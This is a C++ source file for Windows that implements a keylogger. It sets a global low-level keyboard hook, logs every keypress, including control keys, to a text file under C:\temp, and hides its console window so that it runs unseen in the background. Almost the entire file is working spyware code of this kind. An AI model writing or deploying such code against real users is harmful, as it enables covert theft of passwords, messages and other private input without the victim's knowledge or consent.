#define _WIN32_WINNT 0x0500
#include<fstream>
#include<windows.h>
#include<thread>
#include "keystrokes.h"
#include <iostream>
#include <string>
#include <mutex>

std::mutex locker;
std::string buff;


using std::ofstream;
using std::ios;

ofstream out("C:\\temp\\keystrokes.txt", ios::out);

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	// If key is being pressed
	if (wParam == WM_KEYDOWN) {
		switch (p->vkCode) {
			// Invisible keys
		case VK_CAPITAL:	buff += "<CAPLOCK>";		break;
		case VK_SHIFT:		buff += "<SHIFT>";		break;
		case VK_LCONTROL:	buff += "<LCTRL>";		break;
		case VK_RCONTROL:	buff += "<RCTRL>";		break;
		case VK_INSERT:		buff += "<INSERT>";		break;
		case VK_END:		buff += "<END>";			break;
		case VK_PRINT:		buff += "<PRINT>";		break;
		case VK_DELETE:		buff += "<DEL>";			break;
		case VK_BACK:		buff += "<BK>";			break;
		case VK_LEFT:		buff += "<LEFT>";		break;
		case VK_RIGHT:		buff += "<RIGHT>";		break;
		case VK_UP:			buff += "<UP>";			break;
		case VK_DOWN:		buff += "<DOWN>";		break;
			// Visible keys
		default:
			buff += char(tolower(p->vkCode));
		}
		out.flush();
	}
	if (locker.try_lock())
	{
    	out << buff;
		buff.clear();
		locker.unlock();
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}


void timer() 
{
	locker.lock();
	out << "WAIT 1 MINUTE WHILE WE COLLECT THE DATA!\n";
	out.flush();
	std::this_thread::sleep_for(std::chrono::seconds(60));
	locker.unlock();
	std::this_thread::sleep_for(std::chrono::seconds(60));
}

int WINAPI stratKeyLogger()
{
	// Set windows hook

	/*  hiding the console */
	HWND stealth; /*creating stealth (window is not visible)*/
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
	std::thread timer1(timer);
	/* hiding massage box to let the keylogger work in the backround without stucking the computer */
	MSG messages;
	while (GetMessage(&messages, NULL, 0, 0))
	{
			/* Translate virtual-key messages into character messages */
		TranslateMessage(&messages);
		/* Send message to WindowProcedure */
		DispatchMessage(&messages);
	}
	timer1.detach();
	out.close();

	return 0;
}